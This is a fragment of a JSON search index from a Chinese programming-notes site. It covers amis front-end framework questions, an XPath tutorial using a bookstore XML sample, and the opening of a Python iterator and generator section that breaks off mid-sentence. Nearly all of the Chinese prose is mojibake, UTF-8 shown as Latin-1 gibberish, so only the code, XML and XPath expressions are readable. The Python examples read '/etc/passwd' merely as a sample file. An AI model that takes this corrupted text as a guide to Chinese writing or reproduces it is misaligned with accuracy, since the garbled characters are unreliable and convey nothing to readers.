·å†™: { type: \"input-text\", name: \"input_v2\", onEvent: { change: { actions: [ { actionType: \"setValue\", componentName: \"input_v\", args: { value: \"${input_v2}\" } }, ] } } },","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-question-Set-the-value-of-other-components.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Set-the-value-of-other-components.html"},{"title":"æ•°æ®åŸŸçš„å‘ä¸Šæ›´æ–°","text":"é‡ç‚¹! é€‚ç”¨äºå½“å‰æ•°æ®é“¾ ä¸»è¦å¯¹å‰é¢çš„ä¸å½“åšä¸€ä¸ªçº æ­£, è¿™éƒ¨åˆ†çº æ­£æœ‰ç©ºå†æ‰¾å‡ºæ¥æ”¹, åŒä¸€ä¸ªé¡µé¢çš„æ•°æ®åŸŸ, å‘ä¸Šå‘ä¸‹çš„æ›´æ–°éƒ½æ˜¯æ”¯æŒçš„, .. ä¸è¿‡å¤æ‚æƒ…å†µä¸‹, é»˜è®¤ä»…èƒ½ä¿æŒä¸¤å±‚, å¯ä»¥ä½¿ç”¨ trackExpression æ¥ç¡®å®šè·Ÿè¸ªçš„å­—æ®µ; ä¸åŒé¡µé¢çš„, æ¯”å¦‚å¼¹å‡ºä¸€ä¸ªdialog, ç›¸å½“äºæ˜¯ä¸€ä¸ªæ–°çš„é¡µé¢, data åº”å½“æ˜¯è¢«æ‹·è´äº†ä¸€ä»½, dialogæ•°æ®çš„å˜åŒ–æ— æ³•å½±å“åˆ°ä¸Šä¸€å±‚ dialogçˆ¶çº§ç»„ä»¶çš„æ•°æ®å¯ä»¥å‘ä¸‹ä¼ é€’ , ä½†æ˜¯dialogçˆ¶çº§ç»„ä»¶çš„å…„å¼Ÿç»„ä»¶ä¸è¡Œ.","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-question-Upper-update-of-data-domain.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Upper-update-of-data-domain.html"},{"title":"validationséªŒè¯ä¿¡æ¯é…ç½®æ— æ•ˆ","text":"æœ‰æ—¶å€™è¡¨å•ä¿¡æ¯éœ€è¦é…ç½®å­—æ®µéªŒè¯ åªæœ‰åœ¨Formè¡¨å•ä¸­æ‰èƒ½éªŒè¯å­—æ®µ , å› ä¸ºåªæœ‰å®ƒæ‰æœ‰æäº¤åŠŸèƒ½, éªŒè¯ä¸€èˆ¬åªæœ‰æäº¤æˆ–è€…æ´»è§¦å‘è‡ªåŠ¨æäº¤çš„æ—¶å€™æ‰ä¼šè§¦å‘; æˆåŠŸè§¦å‘ä¸€æ¬¡å, çœ‹æ•ˆæœåç»­éƒ½æ˜¯æ­¤å­—æ®µè‡ªåŠ¨ç«‹åˆ»æ ¡éªŒäº† ä¾‹: { type: 'form', body: { type: 'input-text', name: 'eName', label: 'label0', mode: \"horizontal\", validations: { \"isNumeric\": true, \"minimum\": 10, // è¡¨ç¤ºæ•°å­—æœ€å°ä¸º10 }, // description: \"è¯·è¾“å…¥æ•°å­—ç±»å‹æ–‡æœ¬\", validationErrors: { \"isNumeric\": 'ä¸æ˜¯æ•°å­—', \"minimum\": \"åŒå­¦ï¼Œæœ€å°‘è¾“å…¥$1ä»¥ä¸Šçš„æ•°å­—å“ˆ\" } }, xs: 11 },","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-question-Validations-verification-information-configuration-is-invalid.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Validations-verification-information-configuration-is-invalid.html"},{"title":"å˜é‡ä½¿ç”¨","text":"è‹¥å˜é‡åä¸å­˜åœ¨ç‰¹æ®Šå­—ç¬¦æ—¶, å¯ä»¥ç›´æ¥ä½¿ç”¨: $varName è‹¥å­˜åœ¨ç‰¹æ®Šå­—ç¬¦æˆ–è€…ä¸‹åˆ’çº¿æˆ–è€…è¡¨è¾¾å¼ç­‰, éœ€è¦æ‹¬èµ·æ¥æ‰èƒ½æ­£å¸¸è¯†åˆ«ä½æ•°æ®åŸŸæ•°æ®: ${varName} æ‰€ä»¥ä¸€èˆ¬å»ºè®®ç»Ÿä¸€åŠ ä¸ŠèŠ±æ‹¬å· å¦å¤–å¯¹äºè¡¨è¾¾å¼è€Œè¨€, ä¸åŠ èŠ±æ‹¬å·æ˜¯æ—§ç‰ˆç›´æ¥ç”¨js, å¯å‚è€ƒ: https://aisuda.bce.baidu.com/amis/zh-CN/docs/concepts/expression githubä¹Ÿæœ‰ç›¸å…³é—®é¢˜ https://github.com/baidu/amis/issues/9629","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-question-Variable-use.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Variable-use.html"},{"title":"componentNameæ— æ•ˆ","text":"ç»§ç»­ä¸Šä¸€èŠ‚ /docs/å‰ç«¯/æ¡†æ¶/amis/é—®é¢˜/comboæ— æ³•æŒ‡å®šæ›´æ–°æŸä¸€ä¸ª , è‹¥å½“å‰é¡¹çš„ name åŒ…å« . , é‚£ä¹ˆå¯èƒ½ä¼šæŠŠå®ƒåšé”™æ•°æ®æ¥è§£æ(é“¾å¼è°ƒç”¨), å¯¼è‡´ componentName æ— æ³•æ­£ç¡®æŒ‡å‘æƒ³è¦çš„å±æ€§. æ‰€ä»¥, æ§ä»¶ name å‘½åå°½é‡ä¸è¦ä½¿ç”¨ .","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-question-componentname-invalid.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-componentname-invalid.html"},{"title":"å®ä¾‹","text":"æˆ‘ä»¬å°†åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ä½¿ç”¨è¿™ä¸ª XML æ–‡æ¡£ï¼š \"books.xml\": <?xml version=\"1.0\" encoding=\"UTF-8\"?> <bookstore> <book category=\"COOKING\"> <title lang=\"en\">Everyday Italian</title> <author>Giada De Laurentiis</author> <year>2005</year> <price>30.00</price> </book> <book category=\"CHILDREN\"> <title lang=\"en\">Harry Potter</title> <author>J K. Rowling</author> <year>2005</year> <price>29.99</price> </book> <book category=\"WEB\"> <title lang=\"en\">XQuery Kick Start</title> <author>James McGovern</author> <author>Per Bothner</author> <author>Kurt Cagle</author> <author>James Linn</author> <author>Vaidyanathan Nagarajan</author> <year>2003</year> <price>49.99</price> </book> <book category=\"WEB\"> <title lang=\"en\">Learning XML</title> <author>Erik T. Ray</author> <year>2003</year> <price>39.95</price> </book> </bookstore> åŠ è½½ XML æ–‡æ¡£ æ‰€æœ‰ç°ä»£æµè§ˆå™¨éƒ½æ”¯æŒä½¿ç”¨ XMLHttpRequest æ¥åŠ è½½ XML æ–‡æ¡£çš„æ–¹æ³•ã€‚ é’ˆå¯¹å¤§å¤šæ•°ç°ä»£æµè§ˆå™¨çš„ä»£ç : var xmlhttp=new XMLHttpRequest() é’ˆå¯¹å¤è€çš„å¾®è½¯æµè§ˆå™¨ï¼ˆIE 5 å’Œ 6ï¼‰çš„ä»£ç : var xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\") é€‰å–èŠ‚ç‚¹ ä¸å¹¸çš„æ˜¯ï¼ŒInternet Explorer å’Œå…¶ä»–å¤„ç† XPath çš„æ–¹å¼ä¸åŒã€‚ åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼ŒåŒ…å«é€‚ç”¨äºå¤§å¤šæ•°ä¸»æµæµè§ˆå™¨çš„ä»£ç ã€‚ Internet Explorer ä½¿ç”¨ selectNodes() æ–¹æ³•ä» XML æ–‡æ¡£ä¸­çš„é€‰å–èŠ‚ç‚¹: xmlDoc.selectNodes(xpath); Firefoxã€Chromeã€Opera ä»¥åŠ Safari ä½¿ç”¨ evaluate() æ–¹æ³•ä» XML æ–‡æ¡£ä¸­é€‰å–èŠ‚ç‚¹: xmlDoc.evaluate(xpath, xmlDoc, null, XPathResult.ANY_TYPE,null); é€‰å–æ‰€æœ‰ title ä¸‹é¢çš„ä¾‹å­é€‰å–æ‰€æœ‰ title èŠ‚ç‚¹: /bookstore/book/title é€‰å–ç¬¬ä¸€ä¸ª book çš„ title ä¸‹é¢çš„ä¾‹å­é€‰å– bookstore å…ƒç´ ä¸‹é¢çš„ç¬¬ä¸€ä¸ª book èŠ‚ç‚¹çš„ title: /bookstore/book[1]/title è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ã€‚ä¸Šé¢çš„ä¾‹å­åœ¨ IE å’Œå…¶ä»–æµè§ˆå™¨ä¸­è¾“å‡ºä¸åŒçš„ç»“æœã€‚ IE5 ä»¥åŠæ›´é«˜ç‰ˆæœ¬å°† [0] è§†ä¸ºç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼Œè€Œæ ¹æ® W3C çš„æ ‡å‡†ï¼Œåº”è¯¥æ˜¯ [1]ã€‚ ä¸€ç§è§£å†³æ–¹æ³•ï¼ ä¸ºäº†è§£å†³ IE5+ ä¸­ [0] å’Œ [1] çš„é—®é¢˜ï¼Œå¯ä»¥ä¸º XPath è®¾ç½®è¯­è¨€é€‰æ‹©ï¼ˆSelectionLanguageï¼‰ã€‚ ä¸‹é¢çš„ä¾‹å­é€‰å– bookstore å…ƒç´ ä¸‹é¢çš„ç¬¬ä¸€ä¸ª book èŠ‚ç‚¹çš„ title: xml.setProperty(\"SelectionLanguage\",\"XPath\"); xml.selectNodes(\"/bookstore/book[1]/title\"); é€‰å–æ‰€æœ‰ä»·æ ¼ ä¸‹é¢çš„ä¾‹å­é€‰å– price èŠ‚ç‚¹ä¸­çš„æ‰€æœ‰æ–‡æœ¬: /bookstore/book/price/text() é€‰å–ä»·æ ¼é«˜äº 35 çš„ price èŠ‚ç‚¹ ä¸‹é¢çš„ä¾‹å­é€‰å–ä»·æ ¼é«˜äº 35 çš„æ‰€æœ‰ price èŠ‚ç‚¹: /bookstore/book[price>35]/price é€‰å–ä»·æ ¼é«˜äº 35 çš„ title èŠ‚ç‚¹ ä¸‹é¢çš„ä¾‹å­é€‰å–ä»·æ ¼é«˜äº 35 çš„æ‰€æœ‰ title èŠ‚ç‚¹: /bookstore/book[price>35]/title","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-Instance.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-Instance.html"},{"title":"XPathè¯­æ³•","text":"XPath ä½¿ç”¨è·¯å¾„è¡¨è¾¾å¼æ¥é€‰å– XML æ–‡æ¡£ä¸­çš„èŠ‚ç‚¹æˆ–èŠ‚ç‚¹é›†ã€‚èŠ‚ç‚¹æ˜¯é€šè¿‡æ²¿ç€è·¯å¾„ (path) æˆ–è€…æ­¥ (steps) æ¥é€‰å–çš„ã€‚ XML å®ä¾‹æ–‡æ¡£ æˆ‘ä»¬å°†åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ä½¿ç”¨è¿™ä¸ª XML æ–‡æ¡£: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <bookstore> <book> <title lang=\"eng\">Harry Potter</title> <price>29.99</price> </book> <book> <title lang=\"eng\">Learning XML</title> <price>39.95</price> </book> </bookstore> é€‰å–èŠ‚ç‚¹ XPath ä½¿ç”¨è·¯å¾„è¡¨è¾¾å¼åœ¨ XML æ–‡æ¡£ä¸­é€‰å–èŠ‚ç‚¹ã€‚èŠ‚ç‚¹æ˜¯é€šè¿‡æ²¿ç€è·¯å¾„æˆ–è€… step æ¥é€‰å–çš„ã€‚ ä¸‹é¢åˆ—å‡ºäº†æœ€æœ‰ç”¨çš„è·¯å¾„è¡¨è¾¾å¼ï¼š è¡¨è¾¾å¼ æè¿° nodename é€‰å–æ­¤èŠ‚ç‚¹çš„æ‰€æœ‰å­èŠ‚ç‚¹ã€‚ / ä»æ ¹èŠ‚ç‚¹é€‰å–ï¼ˆå–å­èŠ‚ç‚¹ï¼‰ã€‚ ç”¨äºå¼€å¤´è¡¨ç¤ºç»å¯¹è·¯å¾„ // ä»åŒ¹é…é€‰æ‹©çš„å½“å‰èŠ‚ç‚¹é€‰æ‹©æ–‡æ¡£ä¸­çš„èŠ‚ç‚¹ï¼Œè€Œä¸è€ƒè™‘å®ƒä»¬çš„ä½ç½®ï¼ˆå–å­å­™èŠ‚ç‚¹ï¼‰ã€‚ ç”¨äºå¼€å¤´è¡¨ç¤ºç»å¯¹è·¯å¾„ . é€‰å–å½“å‰èŠ‚ç‚¹ã€‚ .. é€‰å–å½“å‰èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ã€‚ @ é€‰å–å±æ€§ã€‚ åœ¨ä¸‹é¢çš„è¡¨æ ¼ä¸­ï¼Œæˆ‘ä»¬å·²åˆ—å‡ºäº†ä¸€äº›è·¯å¾„è¡¨è¾¾å¼ä»¥åŠè¡¨è¾¾å¼çš„ç»“æœ è·¯å¾„è¡¨è¾¾å¼ ç»“æœ bookstore é€‰å– bookstore å…ƒç´ çš„æ‰€æœ‰å­èŠ‚ç‚¹ /bookstore é€‰å–æ ¹å…ƒç´  bookstore æ³¨é‡Šï¼šå‡å¦‚è·¯å¾„èµ·å§‹äºæ­£æ–œæ ( / )ï¼Œåˆ™æ­¤è·¯å¾„å§‹ç»ˆä»£è¡¨åˆ°æŸå…ƒç´ çš„ç»å¯¹è·¯å¾„ï¼ bookstore/book é€‰å–å±äº bookstore çš„å­å…ƒç´ çš„æ‰€æœ‰ book å…ƒç´  //book é€‰å–æ‰€æœ‰ book å­å…ƒç´ ï¼Œè€Œä¸ç®¡å®ƒä»¬åœ¨æ–‡æ¡£ä¸­çš„ä½ç½® bookstore//book é€‰æ‹©å±äº bookstore å…ƒç´ çš„åä»£çš„æ‰€æœ‰ book å…ƒç´ , è€Œä¸ç®¡å®ƒä»¬ä½äº bookstore ä¹‹ä¸‹çš„ä»€ä¹ˆä½ç½® //@lang é€‰å–åä¸º lang çš„æ‰€æœ‰å±æ€§ è°“è¯­ï¼ˆPredicatesï¼‰ è°“è¯­ç”¨æ¥æŸ¥æ‰¾æŸä¸ªç‰¹å®šçš„èŠ‚ç‚¹æˆ–è€…åŒ…å«æŸä¸ªæŒ‡å®šçš„å€¼çš„èŠ‚ç‚¹ã€‚ è°“è¯­è¢«åµŒåœ¨æ–¹æ‹¬å·ä¸­ã€‚ åœ¨ä¸‹é¢çš„è¡¨æ ¼ä¸­ï¼Œæˆ‘ä»¬åˆ—å‡ºäº†å¸¦æœ‰è°“è¯­çš„ä¸€äº›è·¯å¾„è¡¨è¾¾å¼ï¼Œä»¥åŠè¡¨è¾¾å¼çš„ç»“æœï¼š è·¯å¾„è¡¨è¾¾å¼ ç»“æœ /bookstore/book[1] é€‰å–å±äº bookstore å­å…ƒç´ çš„ç¬¬ä¸€ä¸ª book å…ƒç´ ã€‚ /bookstore/book[last()] é€‰å–å±äº bookstore å­å…ƒç´ çš„æœ€åä¸€ä¸ª book å…ƒç´ ã€‚ /bookstore/book[last()-1] é€‰å–å±äº bookstore å­å…ƒç´ çš„å€’æ•°ç¬¬äºŒä¸ª book å…ƒç´ ã€‚ /bookstore/book[position()<3] é€‰å–æœ€å‰é¢çš„ä¸¤ä¸ªå±äº bookstore å…ƒç´ çš„å­å…ƒç´ çš„ book å…ƒç´ ã€‚ //title[@lang] é€‰å–æ‰€æœ‰æ‹¥æœ‰åä¸º lang çš„å±æ€§çš„ title å…ƒç´ ã€‚ //title[@lang='eng'] é€‰å–æ‰€æœ‰ title å…ƒç´ ï¼Œä¸”è¿™äº›å…ƒç´ æ‹¥æœ‰å€¼ä¸º eng çš„ lang å±æ€§ã€‚ /bookstore/book[price>35.00] é€‰å– bookstore å…ƒç´ çš„æ‰€æœ‰ book å…ƒç´ ï¼Œä¸”å…¶ä¸­çš„ price å…ƒç´ çš„å€¼é¡»å¤§äº 35.00ã€‚ /bookstore/book[price>35.00]//title é€‰å– bookstore å…ƒç´ ä¸­çš„ book å…ƒç´ çš„æ‰€æœ‰ title å…ƒç´ ï¼Œ ä¸”å…¶ä¸­çš„ price å…ƒç´ çš„å€¼é¡»å¤§äº 35.00ã€‚ é€‰å–æœªçŸ¥èŠ‚ç‚¹ XPath é€šé…ç¬¦å¯ç”¨æ¥é€‰å–æœªçŸ¥çš„ XML å…ƒç´ ã€‚ ========== =========================== é€šé…ç¬¦ æè¿° ========== =========================== * åŒ¹é…ä»»ä½•å…ƒç´ èŠ‚ç‚¹ã€‚ @* åŒ¹é…ä»»ä½•å±æ€§èŠ‚ç‚¹ã€‚ node() åŒ¹é…ä»»ä½•ç±»å‹çš„èŠ‚ç‚¹ã€‚ ========== =========================== åœ¨ä¸‹é¢çš„è¡¨æ ¼ä¸­ï¼Œæˆ‘ä»¬åˆ—å‡ºäº†ä¸€äº›è·¯å¾„è¡¨è¾¾å¼ï¼Œä»¥åŠè¿™äº›è¡¨è¾¾å¼çš„ç»“æœï¼š è·¯å¾„è¡¨è¾¾å¼ ç»“æœ /bookstore/* é€‰å– bookstore å…ƒç´ çš„æ‰€æœ‰å­å…ƒç´ ã€‚ //* é€‰å–æ–‡æ¡£ä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚ //title[@*] é€‰å–æ‰€æœ‰å¸¦æœ‰å±æ€§çš„ title å…ƒç´ ã€‚ é€‰å–è‹¥å¹²è·¯å¾„ é€šè¿‡åœ¨è·¯å¾„è¡¨è¾¾å¼ä¸­ä½¿ç”¨\"|\"è¿ç®—ç¬¦ï¼Œæ‚¨å¯ä»¥é€‰å–è‹¥å¹²ä¸ªè·¯å¾„ã€‚ åœ¨ä¸‹é¢çš„è¡¨æ ¼ä¸­ï¼Œæˆ‘ä»¬åˆ—å‡ºäº†ä¸€äº›è·¯å¾„è¡¨è¾¾å¼ï¼Œä»¥åŠè¿™äº›è¡¨è¾¾å¼çš„ç»“æœï¼š è·¯å¾„è¡¨è¾¾å¼ ç»“æœ //book/title | //book/price é€‰å– book å…ƒç´ çš„æ‰€æœ‰ title å’Œ price å…ƒç´  //title | //price é€‰å–æ–‡æ¡£ä¸­çš„æ‰€æœ‰ title å’Œ price å…ƒç´  /bookstore/book/title | //price é€‰å–å±äº bookstore å…ƒç´ çš„ book å…ƒç´ çš„æ‰€æœ‰ title å…ƒç´ , ä»¥åŠæ–‡æ¡£ä¸­æ‰€æœ‰çš„ price å…ƒç´ ","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-XPath-grammar.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-XPath-grammar.html"},{"title":"XPathèŠ‚ç‚¹","text":"XPath æœ¯è¯­ èŠ‚ç‚¹ åœ¨ XPath ä¸­ï¼Œæœ‰ä¸ƒç§ç±»å‹çš„èŠ‚ç‚¹ï¼š å…ƒç´  å±æ€§ æ–‡æœ¬ å‘½åç©ºé—´ å¤„ç†æŒ‡ä»¤ æ³¨é‡Š æ–‡æ¡£ï¼ˆæ ¹ï¼‰èŠ‚ç‚¹ XML æ–‡æ¡£æ˜¯è¢«ä½œä¸ºèŠ‚ç‚¹æ ‘æ¥å¯¹å¾…çš„ã€‚æ ‘çš„æ ¹è¢«ç§°ä¸ºæ–‡æ¡£èŠ‚ç‚¹æˆ–è€…æ ¹èŠ‚ç‚¹ã€‚ è¯·çœ‹ä¸‹é¢è¿™ä¸ª XML æ–‡æ¡£: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <bookstore> <book> <title lang=\"en\">Harry Potter</title> <author>J K. Rowling</author> <year>2005</year> <price>29.99</price> </book> </bookstore> ä¸Šé¢çš„XMLæ–‡æ¡£ä¸­çš„èŠ‚ç‚¹ä¾‹å­: <bookstore> (æ–‡æ¡£èŠ‚ç‚¹) <author>J K. Rowling</author> (å…ƒç´ èŠ‚ç‚¹) lang=\"en\" (å±æ€§èŠ‚ç‚¹) åŸºæœ¬å€¼ï¼ˆæˆ–ç§°åŸå­å€¼ï¼ŒAtomic valueï¼‰ åŸºæœ¬å€¼æ˜¯æ— çˆ¶æˆ–æ— å­çš„èŠ‚ç‚¹ã€‚ åŸºæœ¬å€¼çš„ä¾‹å­: J K. Rowling \"en\" é¡¹ç›®ï¼ˆItemï¼‰ é¡¹ç›®æ˜¯åŸºæœ¬å€¼æˆ–è€…èŠ‚ç‚¹ã€‚ èŠ‚ç‚¹å…³ç³» çˆ¶ï¼ˆParentï¼‰ æ¯ä¸ªå…ƒç´ ä»¥åŠå±æ€§éƒ½æœ‰ä¸€ä¸ªçˆ¶ã€‚ åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œbook å…ƒç´ æ˜¯ titleã€authorã€year ä»¥åŠ price å…ƒç´ çš„çˆ¶: <book> <title>Harry Potter</title> <author>J K. Rowling</author> <year>2005</year> <price>29.99</price> </book> å­ï¼ˆChildrenï¼‰ å…ƒç´ èŠ‚ç‚¹å¯æœ‰é›¶ä¸ªã€ä¸€ä¸ªæˆ–å¤šä¸ªå­ã€‚ åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œtitleã€authorã€year ä»¥åŠ price å…ƒç´ éƒ½æ˜¯ book å…ƒç´ çš„å­: <book> <title>Harry Potter</title> <author>J K. Rowling</author> <year>2005</year> <price>29.99</price> </book> åŒèƒï¼ˆSiblingï¼‰ æ‹¥æœ‰ç›¸åŒçš„çˆ¶çš„èŠ‚ç‚¹ åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œtitleã€authorã€year ä»¥åŠ price å…ƒç´ éƒ½æ˜¯åŒèƒ: <book> <title>Harry Potter</title> <author>J K. Rowling</author> <year>2005</year> <price>29.99</price> </book> å…ˆè¾ˆï¼ˆAncestorï¼‰ æŸèŠ‚ç‚¹çš„çˆ¶ã€çˆ¶çš„çˆ¶ï¼Œç­‰ç­‰ã€‚ åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œtitle å…ƒç´ çš„å…ˆè¾ˆæ˜¯ book å…ƒç´ å’Œ bookstore å…ƒç´ : <bookstore> <book> <title>Harry Potter</title> <author>J K. Rowling</author> <year>2005</year> <price>29.99</price> </book> </bookstore> åä»£ï¼ˆDescendantï¼‰ æŸä¸ªèŠ‚ç‚¹çš„å­ï¼Œå­çš„å­ï¼Œç­‰ç­‰ã€‚ åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œbookstore çš„åä»£æ˜¯ bookã€titleã€authorã€year ä»¥åŠ price å…ƒç´ : <bookstore> <book> <title>Harry Potter</title> <author>J K. Rowling</author> <year>2005</year> <price>29.99</price> </book> </bookstore>","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-XPath-node.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-XPath-node.html"},{"title":"XPath è½´ï¼ˆAxesï¼‰","text":"XML å®ä¾‹æ–‡æ¡£ æˆ‘ä»¬å°†åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ä½¿ç”¨æ­¤ XML æ–‡æ¡£: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <bookstore> <book> <title lang=\"en\">Harry Potter</title> <price>29.99</price> </book> <book> <title lang=\"en\">Learning XML</title> <price>39.95</price> </book> </bookstore> è½´å¯å®šä¹‰ç›¸å¯¹äºå½“å‰èŠ‚ç‚¹çš„èŠ‚ç‚¹é›†ã€‚ è½´åç§° ç»“æœ ancestor é€‰å–å½“å‰èŠ‚ç‚¹çš„æ‰€æœ‰å…ˆè¾ˆï¼ˆçˆ¶ã€ç¥–çˆ¶ç­‰ï¼‰ã€‚ ancestor-or-self é€‰å–å½“å‰èŠ‚ç‚¹çš„æ‰€æœ‰å…ˆè¾ˆï¼ˆçˆ¶ã€ç¥–çˆ¶ç­‰ï¼‰ä»¥åŠå½“å‰èŠ‚ç‚¹æœ¬èº«ã€‚ attribute é€‰å–å½“å‰èŠ‚ç‚¹çš„æ‰€æœ‰å±æ€§ã€‚ child é€‰å–å½“å‰èŠ‚ç‚¹çš„æ‰€æœ‰å­å…ƒç´ ã€‚ descendant é€‰å–å½“å‰èŠ‚ç‚¹çš„æ‰€æœ‰åä»£å…ƒç´ ï¼ˆå­ã€å­™ç­‰ï¼‰ã€‚ descendant-or-self é€‰å–å½“å‰èŠ‚ç‚¹çš„æ‰€æœ‰åä»£å…ƒç´ ï¼ˆå­ã€å­™ç­‰ï¼‰ä»¥åŠå½“å‰èŠ‚ç‚¹æœ¬èº«ã€‚ following é€‰å–æ–‡æ¡£ä¸­å½“å‰èŠ‚ç‚¹çš„ç»“æŸæ ‡ç­¾ä¹‹åçš„æ‰€æœ‰èŠ‚ç‚¹ã€‚ following-sibling é€‰å–å½“å‰èŠ‚ç‚¹ä¹‹åçš„æ‰€æœ‰å…„å¼ŸèŠ‚ç‚¹ namespace é€‰å–å½“å‰èŠ‚ç‚¹çš„æ‰€æœ‰å‘½åç©ºé—´èŠ‚ç‚¹ã€‚ parent é€‰å–å½“å‰èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ã€‚ preceding é€‰å–æ–‡æ¡£ä¸­å½“å‰èŠ‚ç‚¹çš„å¼€å§‹æ ‡ç­¾ä¹‹å‰çš„æ‰€æœ‰èŠ‚ç‚¹ã€‚ preceding-sibling é€‰å–å½“å‰èŠ‚ç‚¹ä¹‹å‰çš„æ‰€æœ‰åŒçº§èŠ‚ç‚¹ã€‚ self é€‰å–å½“å‰èŠ‚ç‚¹ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-XPath-shaft.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-XPath-shaft.html"},{"title":"è¿­ä»£å™¨/ç”Ÿæˆå™¨","text":"æ‰‹åŠ¨éå†è¿­ä»£å™¨ ä½¿ç”¨ next() å‡½æ•°å¹¶åœ¨ä»£ç ä¸­æ•è· StopIteration å¼‚ å¸¸: def manual_iter(): with open('/etc/passwd') as f: try: while True: line = next(f) print(line, end='') except StopIteration: pass é€šå¸¸æ¥è®²ï¼ŒStopIteration ç”¨æ¥æŒ‡ç¤ºè¿­ä»£çš„ç»“å°¾ã€‚ ç„¶è€Œï¼Œè¿˜å¯ä»¥é€šè¿‡è¿”å›ä¸€ä¸ªæŒ‡å®šå€¼æ¥æ ‡è®°ç»“å°¾ï¼Œæ¯”å¦‚ None ã€‚ä¸‹é¢æ˜¯ ç¤ºä¾‹: with open('/etc/passwd') as f: while True: line = next(f, None) if line is None: break print(line, end='') å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šä½¿ç”¨ for å¾ªç¯è¯­å¥ç”¨æ¥éå†ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡ã€‚ ä½†æ˜¯ï¼Œå¶å°”ä¹Ÿ éœ€è¦å¯¹è¿­ä»£åšæ›´åŠ ç²¾ç¡®çš„æ§åˆ¶ï¼Œè¿™æ—¶å€™äº†è§£åº•å±‚è¿­ä»£æœºåˆ¶å°±æ˜¾å¾—å°¤ä¸ºé‡è¦äº†: >>> items = [1, 2, 3] >>> # Get the iterator >>> it = iter(items) # Invokes items.__iter__() >>> # Run the iterator >>> next(it) # Invokes it.__next__() 1 >>> next(it) 2 >>> next(it) 3 >>> next(it) Traceback (most recent call last): File \"<stdin>\", line 1, in <module> StopIteration >>> ä»£ç†è¿­ä»£ ä½ æ„å»ºäº†ä¸€ä¸ªè‡ªå®šä¹‰å®¹å™¨å¯¹è±¡ï¼Œé‡Œé¢åŒ…å«æœ‰åˆ—è¡¨ã€å…ƒç»„æˆ–å…¶ä»–å¯è¿­ä»£å¯¹è±¡ã€‚ä½ æƒ³ç›´ æ¥åœ¨ä½ çš„è¿™ä¸ªæ–°å®¹å™¨å¯¹è±¡ä¸Šæ‰§è¡Œè¿­ä»£æ“ä½œ å®é™…ä¸Šä½ åªéœ€è¦å®šä¹‰ä¸€ä¸ª __iter__() æ–¹æ³•ï¼Œå°†è¿­ä»£æ“ä½œä»£ç†åˆ°å®¹å™¨å†…éƒ¨çš„å¯¹è±¡ä¸Š å»ã€‚æ¯”å¦‚: class Node: def __init__(self, value): self._value = value self._children = [] def __repr__(self): return 'Node({!r})'.format(self._value) def add_child(self, node): self._children.append(node) def __iter__(self): return iter(self._children) Python çš„è¿­ä»£å™¨åè®®éœ€è¦ __iter__() æ–¹æ³•è¿”å›ä¸€ä¸ªå®ç°äº† __next__() æ–¹æ³•çš„ è¿­ä»£å™¨å¯¹è±¡ã€‚ å¦‚æœä½ åªæ˜¯è¿­ä»£éå†å…¶ä»–å®¹å™¨çš„å†…å®¹ï¼Œä½ æ— é¡»æ‹…å¿ƒåº•å±‚æ˜¯æ€æ ·å®ç°çš„ã€‚ä½  æ‰€è¦åšçš„åªæ˜¯ä¼ é€’è¿­ä»£è¯·æ±‚æ—¢å¯ã€‚ è¿™é‡Œçš„ iter() å‡½æ•°çš„ä½¿ç”¨ç®€åŒ–äº†ä»£ç ï¼Œiter(s) åªæ˜¯ç®€å•çš„é€šè¿‡è°ƒç”¨ s. __iter__() æ–¹æ³•æ¥è¿”å›å¯¹åº”çš„è¿­ä»£å™¨å¯¹è±¡ï¼Œ å°±è·Ÿ len(s) ä¼šè°ƒç”¨ s.__len__() åŸç† æ˜¯ä¸€æ ·çš„ã€‚ ä½¿ç”¨ç”Ÿæˆå™¨åˆ›å»ºæ–°çš„è¿­ä»£æ¨¡å¼ ä½ æƒ³å®ç°ä¸€ä¸ªè‡ªå®šä¹‰è¿­ä»£æ¨¡å¼ï¼Œè·Ÿæ™®é€šçš„å†…ç½®å‡½æ•°æ¯”å¦‚ range() , reversed() ä¸ ä¸€æ ·: def frange(start, stop, increment): x = start while x < stop: yield x x += increment ä¸€ä¸ªå‡½æ•°ä¸­éœ€è¦æœ‰ä¸€ä¸ª yield 